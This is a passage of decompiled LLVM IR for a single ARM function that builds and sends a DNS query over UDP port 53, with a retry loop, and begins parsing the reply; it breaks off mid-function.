define i32 @function_10144(i8* %arg1) local_unnamed_addr {
dec_label_pc_10144:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-4288 = alloca i8, align 1
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-2227 = alloca i32, align 4
  %stack_var_-2240 = alloca i8, align 1
  %stack_var_-2228 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10144 = load i32, i32* @r4, align 4
  store i32 %v3_10144, i32* %stack_var_-36, align 4
  %v6_10144 = load i32, i32* @r5, align 4
  %v9_10144 = load i32, i32* @r6, align 4
  %v12_10144 = load i32, i32* @r7, align 4
  %v15_10144 = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_1015c = call i32 @function_14254(i32 1, i32 8)
  %v0_10164 = load i32, i32* @r4, align 4
  %v1_10164 = inttoptr i32 %v0_10164 to i8*
  store i32 %v0_10164, i32* %r0.global-to-local, align 4
  %v3_10168 = call i32 @function_12c94(i8* %v1_10164)
  %v2_10170 = ptrtoint i32* %stack_var_-2228 to i32
  store i32 %v2_10170, i32* %fp.global-to-local, align 4
  %v2_10174 = ptrtoint i8* %stack_var_-2240 to i32
  %v1_10178 = add i32 %v3_10168, 1
  store i32 %v1_10178, i32* %r0.global-to-local, align 4
  %v2_1017c = ptrtoint i32* %stack_var_-2227 to i32
  store i32 %v2_1017c, i32* %r2.global-to-local, align 4
  store i32 %v2_10170, i32* %r5.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v2_101bc162 = icmp eq i32 %v1_10178, 0
  store i1 %v2_101bc162, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v1_101c4163 = or i32 %v2_1017c, 1
  store i32 %v1_101c4163, i32* %r1.global-to-local, align 4
  %tmp124164 = icmp slt i32 %v1_10178, 1
  br i1 %tmp124164, label %dec_label_pc_101cc, label %dec_label_pc_1018c.lr.ph

dec_label_pc_1018c.lr.ph:                         ; preds = %dec_label_pc_10144
  %v0_1018c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1018c

dec_label_pc_1018c:                               ; preds = %dec_label_pc_1018c.lr.ph, %.thread12
  %v1_101a0176.off0 = phi i8 [ 0, %dec_label_pc_1018c.lr.ph ], [ %extract.t179, %.thread12 ]
  %v0_1018c = phi i32 [ %v0_1018c.pre, %dec_label_pc_1018c.lr.ph ], [ %v1_101b0, %.thread12 ]
  %v2_101d0165 = phi i32 [ %v2_1017c, %dec_label_pc_1018c.lr.ph ], [ %v0_101b8, %.thread12 ]
  %v1_1018c = inttoptr i32 %v0_1018c to i8*
  %v2_1018c = load i8, i8* %v1_1018c, align 1
  %v3_1018c = zext i8 %v2_1018c to i32
  store i32 %v3_1018c, i32* %r3.global-to-local, align 4
  %v2_10190 = icmp eq i8 %v2_1018c, 0
  store i1 %v2_10190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10190, label %.thread6, label %bb

bb:                                               ; preds = %dec_label_pc_1018c
  %v8_10194 = icmp eq i8 %v2_1018c, 46
  store i1 %v8_10194, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10194, label %.thread6, label %.thread

.thread:                                          ; preds = %bb
  %v4_10198 = inttoptr i32 %v2_101d0165 to i8*
  store i8 %v2_1018c, i8* %v4_10198, align 1
  %v5_10198 = load i32, i32* %r2.global-to-local, align 4
  %v6_10198 = add i32 %v5_10198, 1
  store i32 %v6_10198, i32* %r2.global-to-local, align 4
  %v0_1019c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1019c.pr.pr, label %.thread..thread6_crit_edge, label %bb122

.thread..thread6_crit_edge:                       ; preds = %.thread
  %v1_101a0.pre = load i32, i32* %lr.global-to-local, align 4
  %extract.t = trunc i32 %v1_101a0.pre to i8
  br label %.thread6

.thread6:                                         ; preds = %.thread..thread6_crit_edge, %bb, %dec_label_pc_1018c
  %v1_101a0.off0 = phi i8 [ %extract.t, %.thread..thread6_crit_edge ], [ %v1_101a0176.off0, %bb ], [ %v1_101a0176.off0, %dec_label_pc_1018c ]
  %v3_101a0 = load i32, i32* %r5.global-to-local, align 4
  %v4_101a0 = inttoptr i32 %v3_101a0 to i8*
  store i8 %v1_101a0.off0, i8* %v4_101a0, align 1
  %v0_101a4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_101a4.pr, label %bb123, label %..thread12_crit_edge

bb122:                                            ; preds = %.thread
  store i32 %v6_10198, i32* %r1.global-to-local, align 4
  %v1_101a4 = load i32, i32* %ip.global-to-local, align 4
  %v2_101a4 = urem i32 %v1_101a4, 256
  store i32 %v2_101a4, i32* %lr.global-to-local, align 4
  br label %.thread12

..thread12_crit_edge:                             ; preds = %.thread6
  %v1_101a410 = load i32, i32* %ip.global-to-local, align 4
  %v2_101a411 = urem i32 %v1_101a410, 256
  store i32 %v2_101a411, i32* %lr.global-to-local, align 4
  br label %.thread12

bb123:                                            ; preds = %.thread6
  %v1_101a8.pre = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_101a8.pre, i32* %r5.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb122, %..thread12_crit_edge, %bb123
  %v0_101c0.pre = phi i32 [ %v2_101a411, %..thread12_crit_edge ], [ %v2_101a4, %bb122 ], [ 0, %bb123 ]
  %v0_101b0 = load i32, i32* @r4, align 4
  %v1_101b0 = add i32 %v0_101b0, 1
  store i32 %v1_101b0, i32* @r4, align 4
  %v0_101b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_101b4 = add i32 %v0_101b4, -1
  store i32 %v1_101b4, i32* %r0.global-to-local, align 4
  %v0_101b8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_101b8, i32* %r2.global-to-local, align 4
  %v2_101bc = icmp eq i32 %v1_101b4, 0
  store i1 %v2_101bc, i1* %cpsr_z.global-to-local, align 1
  %v1_101c0 = add nuw nsw i32 %v0_101c0.pre, 1
  store i32 %v1_101c0, i32* %ip.global-to-local, align 4
  %v1_101c4 = add i32 %v0_101b8, 1
  store i32 %v1_101c4, i32* %r1.global-to-local, align 4
  %tmp124 = icmp slt i32 %v1_101b4, 1
  %extract.t179 = trunc i32 %v0_101c0.pre to i8
  br i1 %tmp124, label %dec_label_pc_101cc, label %dec_label_pc_1018c

dec_label_pc_101cc:                               ; preds = %.thread12, %dec_label_pc_10144
  %v2_101d0.lcssa = phi i32 [ %v2_1017c, %dec_label_pc_10144 ], [ %v0_101b8, %.thread12 ]
  %v3_1015c = inttoptr i32 %v2_1015c to i8*
  store i32 0, i32* @r4, align 4
  %v3_101d0 = inttoptr i32 %v2_101d0.lcssa to i8*
  store i8 0, i8* %v3_101d0, align 1
  store i32 %v2_10170, i32* %r0.global-to-local, align 4
  %v1_101d8 = bitcast i32* %stack_var_-2228 to i8*
  %v2_101d8 = call i32 @function_12c94(i8* %v1_101d8)
  %v2_101dc = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_101dc, i32* %r1.global-to-local, align 4
  %v0_101e0 = load i32, i32* %fp.global-to-local, align 4
  %v2_101e0 = add i32 %v0_101e0, %v2_101d8
  store i32 %v2_101e0, i32* @r5, align 4
  %v0_101e4 = load i32, i32* @r4, align 4
  store i32 %v0_101e4, i32* %stack_var_-64, align 4
  store i32 %v2_10170, i32* %r0.global-to-local, align 4
  %v2_101f8 = call i32 @function_12c94(i8* %v1_101d8)
  %v1_101fc = add i32 %v2_101f8, 17
  store i32 %v1_101fc, i32* %r0.global-to-local, align 4
  %v0_10204 = call i32 @function_fe60()
  store i32 %v0_10204, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r1.global-to-local, align 4
  %v2_10210 = call i32 @function_133b0(i32 %v0_10204, i32 65535)
  store i32 16, i32* %r1.global-to-local, align 4
  %v6_1021c = urem i32 %v2_10210, 65536
  store i32 %v6_1021c, i32* %r3.global-to-local, align 4
  %v2_10224 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_10224, i32* %r0.global-to-local, align 4
  %v2_1022c = call i32 @function_12d34(i32 %v2_10224, i32 16)
  %sext = mul i32 %v2_10210, 16777216
  %v4_10230 = sdiv i32 %sext, 16777216
  store i32 2, i32* %stack_var_-64, align 4
  store i32 %v2_101dc, i32* %r3.global-to-local, align 4
  store i32 53, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v4_10230, i32* %lr.global-to-local, align 4
  %v0_10278 = load i32, i32* @r5, align 4
  %v2_10278 = add i32 %v0_10278, 1
  store i32 %v2_10278, i32* %ip.global-to-local, align 4
  %v2_1027c = ptrtoint i8* %stack_var_-4288 to i32
  store i32 %v2_1027c, i32* %r1.global-to-local, align 4
  %v5_10280 = trunc i32 %v4_10230 to i8
  store i8 %v5_10280, i8* %stack_var_-2240, align 1
  %v0_10298 = load i32, i32* @r4, align 4
  %v1_10298 = trunc i32 %v0_10298 to i8
  %v4_10298 = inttoptr i32 %v2_10278 to i8*
  store i8 %v1_10298, i8* %v4_10298, align 1
  %v0_1029c = load i32, i32* @r4, align 4
  %v1_1029c = trunc i32 %v0_1029c to i8
  %v2_1029c = load i32, i32* %ip.global-to-local, align 4
  %v3_1029c = add i32 %v2_1029c, 2
  %v4_1029c = inttoptr i32 %v3_1029c to i8*
  store i8 %v1_1029c, i8* %v4_1029c, align 1
  %v0_102a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_102a0 = trunc i32 %v0_102a0 to i8
  %v2_102a0 = load i32, i32* %ip.global-to-local, align 4
  %v3_102a0 = add i32 %v2_102a0, 3
  %v4_102a0 = inttoptr i32 %v3_102a0 to i8*
  store i8 %v1_102a0, i8* %v4_102a0, align 1
  %v0_102a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_102a4 = trunc i32 %v0_102a4 to i8
  %v2_102a4 = load i32, i32* %ip.global-to-local, align 4
  %v3_102a4 = add i32 %v2_102a4, 1
  %v4_102a4 = inttoptr i32 %v3_102a4 to i8*
  store i8 %v1_102a4, i8* %v4_102a4, align 1
  %v0_102ac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_102ac, i32* %sl.global-to-local, align 4
  %v2_102b4 = ptrtoint i32* %stack_var_-192 to i32
  store i32 %v2_102b4, i32* @r6, align 4
  %v3_102ec = bitcast i32* %stack_var_-64 to %sockaddr*
  %v4_10308 = bitcast i8* %stack_var_-2240 to i32*
  %v2_10358 = ptrtoint i32* %stack_var_-36 to i32
  %v2_10384 = ptrtoint i32* %stack_var_-48 to i32
  %v6_103e0 = bitcast i8* %stack_var_-4288 to i32*
  %v1_1045c = add i32 %v2_1027c, 12
  %v1_10464 = inttoptr i32 %v1_1045c to i8*
  %v1_10478 = add i32 %v2_1027c, 1
  %v2_10478 = inttoptr i32 %v1_10478 to i8*
  %v1_10494 = add i32 %v2_1027c, 6
  %v2_10494 = inttoptr i32 %v1_10494 to i8*
  %v1_10498 = add i32 %v2_1027c, 7
  %v2_10498 = inttoptr i32 %v1_10498 to i8*
  br label %dec_label_pc_102b8

dec_label_pc_102b8:                               ; preds = %dec_label_pc_1040c, %dec_label_pc_101cc
  %v1_102bc = phi i32 [ %v0_102b8.pre, %dec_label_pc_1040c ], [ -1, %dec_label_pc_101cc ]
  %v7_102b8 = icmp eq i32 %v1_102bc, -1
  store i1 %v7_102b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102b8, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_102b8
  store i32 %v1_102bc, i32* %r0.global-to-local, align 4
  br label %bb126

bb126:                                            ; preds = %dec_label_pc_102b8, %bb125
  store i32 66244, i32* @lr, align 4
  %v1_102c0 = xor i1 %v7_102b8, true
  call void @__pseudo_cond_branch(i1 %v1_102c0, i32 ptrtoint (i32* @global_var_13654.26 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_102d0 = call i32 @function_13f50(i32 2, i32 2, i32 0)
  store i32 %v3_102d0, i32* %r0.global-to-local, align 4
  %v7_102d4 = icmp eq i32 %v3_102d0, -1
  store i1 %v7_102d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_102d0, i32* @r7, align 4
  br i1 %v7_102d4, label %dec_label_pc_1044c, label %dec_label_pc_102e0

dec_label_pc_102e0:                               ; preds = %bb126
  store i32 %v2_10224, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_102ec = call i32 @function_13dac(i32 %v3_102d0, %sockaddr* %v3_102ec, i32 16)
  store i32 %v4_102ec, i32* %r0.global-to-local, align 4
  %v7_102f0 = icmp eq i32 %v4_102ec, -1
  store i1 %v7_102f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102f0, label %dec_label_pc_10414, label %dec_label_pc_102f8

dec_label_pc_102f8:                               ; preds = %dec_label_pc_102e0
  %v0_102f8 = load i32, i32* @r7, align 4
  store i32 %v0_102f8, i32* %r0.global-to-local, align 4
  store i32 %v2_10174, i32* %r1.global-to-local, align 4
  store i32 %v1_101fc, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_10308 = call i32 @function_13ec0(i32 %v0_102f8, i32* %v4_10308, i32 %v1_101fc, i32 16384)
  store i32 %v5_10308, i32* %r0.global-to-local, align 4
  %v7_1030c = icmp eq i32 %v5_10308, -1
  store i1 %v7_1030c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1030c, label %dec_label_pc_10414, label %dec_label_pc_10314

dec_label_pc_10314:                               ; preds = %dec_label_pc_102f8
  %v0_10314 = load i32, i32* @r7, align 4
  store i32 %v0_10314, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_10320 = call i32 @function_13564(i32 3, i32 %v0_10314)
  store i32 0, i32* @r4, align 4
  %v1_10328 = or i32 %v2_10320, 2048
  store i32 %v1_10328, i32* @r2, align 4
  %v0_1032c = load i32, i32* @r7, align 4
  store i32 %v0_1032c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_10334 = call i32 @function_13564(i32 4, i32 %v0_1032c)
  store i32 %v2_10334, i32* %r0.global-to-local, align 4
  %v0_10338 = load i32, i32* @r4, align 4
  store i32 %v0_10338, i32* %r3.global-to-local, align 4
  %v2_1033c154 = load i32, i32* @r6, align 4
  %v3_1033c155 = add i32 %v2_1033c154, %v0_10338
  %v4_1033c156 = inttoptr i32 %v3_1033c155 to i32*
  store i32 %v0_10338, i32* %v4_1033c156, align 4
  %v0_10340157 = load i32, i32* %r3.global-to-local, align 4
  %v1_10340158 = add i32 %v0_10340157, 4
  store i32 %v1_10340158, i32* %r3.global-to-local, align 4
  %v7_10344159 = icmp eq i32 %v1_10340158, 128
  br i1 %v7_10344159, label %dec_label_pc_1034c, label %dec_label_pc_1033c.dec_label_pc_1033c_crit_edge

dec_label_pc_1033c.dec_label_pc_1033c_crit_edge:  ; preds = %dec_label_pc_10314, %dec_label_pc_1033c.dec_label_pc_1033c_crit_edge
  %v1_10340160 = phi i32 [ %v1_10340, %dec_label_pc_1033c.dec_label_pc_1033c_crit_edge ], [ %v1_10340158, %dec_label_pc_10314 ]
  %v0_1033c.pre = load i32, i32* @r4, align 4
  %v2_1033c = load i32, i32* @r6, align 4
  %v3_1033c = add i32 %v2_1033c, %v1_10340160
  %v4_1033c = inttoptr i32 %v3_1033c to i32*
  store i32 %v0_1033c.pre, i32* %v4_1033c, align 4
  %v0_10340 = load i32, i32* %r3.global-to-local, align 4
  %v1_10340 = add i32 %v0_10340, 4
  store i32 %v1_10340, i32* %r3.global-to-local, align 4
  %v7_10344 = icmp eq i32 %v1_10340, 128
  br i1 %v7_10344, label %dec_label_pc_1034c, label %dec_label_pc_1033c.dec_label_pc_1033c_crit_edge

dec_label_pc_1034c:                               ; preds = %dec_label_pc_1033c.dec_label_pc_1033c_crit_edge, %dec_label_pc_10314
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_1034c = load i32, i32* @r7, align 4
  %v3_1034c = udiv i32 %v0_1034c, 32
  %v3_10354 = mul nuw nsw i32 %v3_1034c, 4
  store i32 %v3_10354, i32* %r3.global-to-local, align 4
  store i32 %v2_10358, i32* %r2.global-to-local, align 4
  %v2_1035c = add i32 %v3_10354, %v2_10358
  store i32 %v2_1035c, i32* @r5, align 4
  %v1_10360 = add i32 %v2_1035c, -156
  %v2_10360 = inttoptr i32 %v1_10360 to i32*
  %v3_10360 = load i32, i32* %v2_10360, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_10368 = urem i32 %v0_1034c, 32
  store i32 %v1_10368, i32* @r8, align 4
  %v7_1036c = shl i32 1, %v1_10368
  %v8_1036c = or i32 %v3_10360, %v7_1036c
  store i32 5, i32* %ip.global-to-local, align 4
  store i32 %v8_1036c, i32* %v2_10360, align 4
  %v0_1037c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_1037c, i32* %stack_var_-48, align 4
  store i32 %v2_10384, i32* @lr, align 4
  store i32 %v2_101dc, i32* %ip.global-to-local, align 4
  %v0_1038c = load i32, i32* @r7, align 4
  %v1_1038c = load i32, i32* %r3.global-to-local, align 4
  %v2_1038c = add i32 %v1_1038c, %v0_1038c
  store i32 %v2_1038c, i32* %r0.global-to-local, align 4
  store i32 %v2_102b4, i32* %r1.global-to-local, align 4
  %v0_10398 = load i32, i32* @r4, align 4
  store i32 %v0_10398, i32* %r2.global-to-local, align 4
  store i32 %v0_10398, i32* %r3.global-to-local, align 4
  %v5_103a4 = call i32 @function_13874(i32 %v2_1038c, i32 %v2_102b4, i32 %v0_10398, i32 %v0_10398, i32 %v2_10384)
  store i32 %v5_103a4, i32* %r0.global-to-local, align 4
  %v7_103a8 = icmp eq i32 %v5_103a4, -1
  store i1 %v7_103a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103a8, label %dec_label_pc_10424, label %dec_label_pc_103b0

dec_label_pc_103b0:                               ; preds = %dec_label_pc_1034c
  %v2_103b0 = icmp eq i32 %v5_103a4, 0
  store i1 %v2_103b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_103b0, label %dec_label_pc_10404, label %dec_label_pc_103b8

dec_label_pc_103b8:                               ; preds = %dec_label_pc_103b0
  %v0_103b8 = load i32, i32* @r5, align 4
  %v1_103b8 = add i32 %v0_103b8, -156
  %v2_103b8 = inttoptr i32 %v1_103b8 to i32*
  %v3_103b8 = load i32, i32* %v2_103b8, align 4
  %v1_103bc = load i32, i32* @r8, align 4
  %v6_103bc = ashr i32 %v3_103b8, %v1_103bc
  store i32 %v6_103bc, i32* %r3.global-to-local, align 4
  %v1_103c0 = urem i32 %v6_103bc, 2
  %v2_103c0 = icmp eq i32 %v1_103c0, 0
  store i1 %v2_103c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_103c0, label %dec_label_pc_10424, label %dec_label_pc_103c8

dec_label_pc_103c8:                               ; preds = %dec_label_pc_103b8
  store i32 %v2_1027c, i32* %r1.global-to-local, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103d4 = load i32, i32* @r7, align 4
  store i32 %v0_103d4, i32* %r0.global-to-local, align 4
  %v0_103d8 = load i32, i32* @r4, align 4
  %v7_103e0 = call i32 @function_13e8c(i32 %v0_103d4, i32* %v6_103e0, i32 2048, i32 16384, i32 %v0_103d8, i32 %v0_103d8)
  store i32 %v7_103e0, i32* %r4.global-to-local, align 4
  %v0_103e8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_103e8, i32* %r0.global-to-local, align 4
  %v1_103ec = inttoptr i32 %v0_103e8 to i8*
  %v2_103ec = call i32 @function_12c94(i8* %v1_103ec)
  %v1_103f0 = add i32 %v2_103ec, 17
  store i32 %v1_103f0, i32* %r0.global-to-local, align 4
  %v0_103f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_103f4 = icmp ult i32 %v0_103f4, %v1_103f0
  %v9_103f4 = icmp eq i32 %v0_103f4, %v1_103f0
  store i1 %v9_103f4, i1* %cpsr_z.global-to-local, align 1
  store i32 -4252, i32* @r4, align 4
  br i1 %v3_103f4, label %dec_label_pc_10404, label %dec_label_pc_10458

dec_label_pc_10404:                               ; preds = %dec_label_pc_103c8, %dec_label_pc_10458, %dec_label_pc_10494, %dec_label_pc_103b0, %dec_label_pc_1044c
  %v0_10404 = load i32, i32* %sl.global-to-local, align 4
  %v7_10404 = icmp eq i32 %v0_10404, 5
  store i1 %v7_10404, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10404, label %dec_label_pc_10424, label %dec_label_pc_1040c

dec_label_pc_1040c:                               ; preds = %dec_label_pc_10414, %dec_label_pc_10404
  %v0_1040c = phi i32 [ %v0_1041c, %dec_label_pc_10414 ], [ %v0_10404, %dec_label_pc_10404 ]
  %v1_1040c = add i32 %v0_1040c, 1
  store i32 %v1_1040c, i32* %sl.global-to-local, align 4
  %v0_102b8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_102b8

dec_label_pc_10414:                               ; preds = %dec_label_pc_102f8, %dec_label_pc_102e0
  %v0_10414 = phi i32 [ %v5_10308, %dec_label_pc_102f8 ], [ %v4_102ec, %dec_label_pc_102e0 ]
  %v1_10414 = add i32 %v0_10414, 2
  store i32 %v1_10414, i32* %r0.global-to-local, align 4
  %v1_10418 = call i32 @function_14a84(i32 %v1_10414)
  store i32 %v1_10418, i32* %r0.global-to-local, align 4
  %v0_1041c = load i32, i32* %sl.global-to-local, align 4
  %v7_1041c = icmp eq i32 %v0_1041c, 5
  store i1 %v7_1041c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1041c, label %dec_label_pc_10424, label %dec_label_pc_1040c

dec_label_pc_10424:                               ; preds = %dec_label_pc_10414, %dec_label_pc_10404, %dec_label_pc_103b8, %dec_label_pc_1034c, %dec_label_pc_104a4, %dec_label_pc_104b0.backedge
  %v0_10424 = load i32, i32* @r7, align 4
  store i32 %v0_10424, i32* %r0.global-to-local, align 4
  %v1_10428 = call i32 @function_13654(i32 %v0_10424)
  store i32 %v1_10428, i32* %r0.global-to-local, align 4
  store i32 %v2_1015c, i32* %r2.global-to-local, align 4
  %v2_10430 = load i8, i8* %v3_1015c, align 1
  %v3_10430 = zext i8 %v2_10430 to i32
  store i32 %v3_10430, i32* @r4, align 4
  %v2_10434 = icmp eq i8 %v2_10430, 0
  store i1 %v2_10434, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10434, label %dec_label_pc_10590, label %dec_label_pc_1043c

dec_label_pc_1043c:                               ; preds = %dec_label_pc_10424, %dec_label_pc_10590
  %stack_var_-4300.0 = phi i8* [ %v5_105a4, %dec_label_pc_10590 ], [ %v3_1015c, %dec_label_pc_10424 ]
  %v4_1043c = ptrtoint i8* %stack_var_-4300.0 to i32
  store i32 %v4_1043c, i32* %r0.global-to-local, align 4
  %v2_10448 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_10448, i32* @r4, align 4
  store i32 %v6_10144, i32* @r5, align 4
  store i32 %v9_10144, i32* @r6, align 4
  store i32 %v12_10144, i32* @r7, align 4
  store i32 %v15_10144, i32* @r8, align 4
  ret i32 %v4_1043c

dec_label_pc_1044c:                               ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10450 = call i32 @function_14a84(i32 1)
  store i32 %v1_10450, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10404

dec_label_pc_10458:                               ; preds = %dec_label_pc_103c8
  store i32 %v2_1027c, i32* %lr.global-to-local, align 4
  store i32 %v1_1045c, i32* %fp.global-to-local, align 4
  store i32 %v1_1045c, i32* %r0.global-to-local, align 4
  %v2_10464 = call i32 @function_12c94(i8* %v1_10464)
  store i32 %v2_10464, i32* %r0.global-to-local, align 4
  store i32 %v2_1027c, i32* %ip.global-to-local, align 4
  store i32 %v2_10358, i32* %r1.global-to-local, align 4
  %v4_10474 = load i8, i8* %stack_var_-4288, align 1
  %v5_10474 = sext i8 %v4_10474 to i32
  store i32 %v5_10474, i32* %r3.global-to-local, align 4
  %v3_10478 = load i8, i8* %v2_10478, align 1
  %v4_10478 = zext i8 %v3_10478 to i32
  store i32 %v4_10478, i32* %r2.global-to-local, align 4
  store i32 %v4_10230, i32* @lr, align 4
  %v4_10480 = mul nuw nsw i32 %v4_10478, 256
  %v5_10480 = or i32 %v4_10480, %v5_10474
  store i32 %v5_10480, i32* %r3.global-to-local, align 4
  %v0_10484 = load i32, i32* %fp.global-to-local, align 4
  %v9_10488 = icmp eq i32 %v5_10480, %v4_10230
  store i1 %v9_10488, i1* %cpsr_z.global-to-local, align 1
  %v2_10484 = add i32 %v2_10464, 5
  %v1_1048c = add i32 %v2_10484, %v0_10484
  store i32 %v1_1048c, i32* %r0.global-to-local, align 4
  br i1 %v9_10488, label %dec_label_pc_10494, label %dec_label_pc_10404

dec_label_pc_10494:                               ; preds = %dec_label_pc_10458
  %v3_10494 = load i8, i8* %v2_10494, align 1
  %v4_10494 = zext i8 %v3_10494 to i32
  store i32 %v4_10494, i32* %r2.global-to-local, align 4
  %v3_10498 = load i8, i8* %v2_10498, align 1
  %v4_10498 = zext i8 %v3_10498 to i32
  store i32 %v4_10498, i32* %r3.global-to-local, align 4
  %v4_1049c = mul nuw nsw i32 %v4_10498, 256
  %v5_1049c = or i32 %v4_1049c, %v4_10494
  store i32 %v5_1049c, i32* %r2.global-to-local, align 4
  %v7_1049c = icmp eq i32 %v5_1049c, 0
  store i1 %v7_1049c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1049c, label %dec_label_pc_10404, label %dec_label_pc_104a4

dec_label_pc_104a4:                               ; preds = %dec_label_pc_10494
  %v3_104a8 = mul nuw nsw i32 %v4_10494, 256
  %v5_104ac = or i32 %v4_10498, %v3_104a8
  %v1_10564 = add i32 %v2_1027c, -49152
  %v1_104b0143 = add nsw i32 %v5_104ac, -1
  %v3_104b4144 = mul i32 %v1_104b0143, 65536
  store i32 %v3_104b4144, i32* %r3.global-to-local, align 4
  %v7_104b8150 = icmp eq i32 %v3_104b4144, -65536
  store i1 %v7_104b8150, i1* %cpsr_z.global-to-local, align 1
  %v3_104bc151 = urem i32 %v1_104b0143, 65536
  store i32 %v3_104bc151, i32* @r6, align 4
  br i1 %v7_104b8150, label %dec_label_pc_10424, label %dec_label_pc_104c4.lr.ph

dec_label_pc_104c4.lr.ph:                         ; preds = %dec_label_pc_104a4
  %v1_10640 = add i32 %v2_1015c, 4
  %v2_10640 = inttoptr i32 %v1_10640 to i32*
  br label %dec_label_pc_104c4

dec_label_pc_104c4:                               ; preds = %dec_label_pc_104c4.lr.ph, %dec_label_pc_104b0.backedge
  %v3_104bc153 = phi i32 [ %v3_104bc151, %dec_label_pc_104c4.lr.ph ], [ %v3_104bc, %dec_label_pc_104b0.backedge ]
  %v0_10518152 = phi i32 [ %v1_1048c, %dec_label_pc_104c4.lr.ph ], [ %storemerge, %dec_label_pc_104b0.backedge ]
  store i32 %v0_10518152, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v1_104d017 = inttoptr i32 %v0_10518152 to i8*
  %v2_104d018 = load i8, i8* %v1_104d017, align 1
  %v3_104d019 = zext i8 %v2_104d018 to i32
  store i32 %v3_104d019, i32* %r2.global-to-local, align 4
  %v2_104d420 = icmp eq i8 %v2_104d018, 0
  store i1 %v2_104d420, i1* %cpsr_z.global-to-local, align 1
  %v3_104d821 = mul nuw nsw i32 %v3_104d019, 256
  store i32 %v3_104d821, i32* %r1.global-to-local, align 4
  br i1 %v2_104d420, label %dec_label_pc_10510, label %dec_label_pc_104e0.preheader

dec_label_pc_104e0.preheader:                     ; preds = %dec_label_pc_104c4, %dec_label_pc_104d0.backedge
  %v1_105b4 = phi i32 [ %v1_105b449, %dec_label_pc_104d0.backedge ], [ 1, %dec_label_pc_104c4 ]
  %v0_105ac47 = phi i32 [ %v0_105ac, %dec_label_pc_104d0.backedge ], [ 0, %dec_label_pc_104c4 ]
  %v0_104ec45 = phi i32 [ %v3_104d8, %dec_label_pc_104d0.backedge ], [ %v3_104d821, %dec_label_pc_104c4 ]
  %v0_104e843 = phi i32 [ %v1_105b0, %dec_label_pc_104d0.backedge ], [ %v0_10518152, %dec_label_pc_104c4 ]
  %v0_104e041 = phi i32 [ %v3_104d0, %dec_label_pc_104d0.backedge ], [ %v3_104d019, %dec_label_pc_104c4 ]
  br label %dec_label_pc_104e0

dec_label_pc_104e0:                               ; preds = %dec_label_pc_104e0.preheader, %dec_label_pc_104e8
  %v0_105ac = phi i32 [ %v0_105ac47, %dec_label_pc_104e0.preheader ], [ 1, %dec_label_pc_104e8 ]
